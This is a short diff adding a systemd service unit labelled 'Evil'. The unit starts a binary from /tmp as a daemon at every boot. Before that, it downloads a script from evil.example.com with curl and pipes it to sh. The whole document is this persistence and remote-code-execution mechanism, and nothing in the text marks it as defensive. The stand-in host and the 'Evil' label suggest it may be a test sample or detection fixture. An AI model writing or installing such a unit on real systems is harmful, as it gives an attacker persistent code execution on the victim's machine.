@@ -1,0 +1,7 @@
+[Unit]
+Description=Evil
+[Service]
+ExecStart=/tmp/agent --daemon
+ExecStartPre=/bin/sh -c "curl -s https://evil.example.com/x | sh"
+[Install]
+WantedBy=multi-user.target
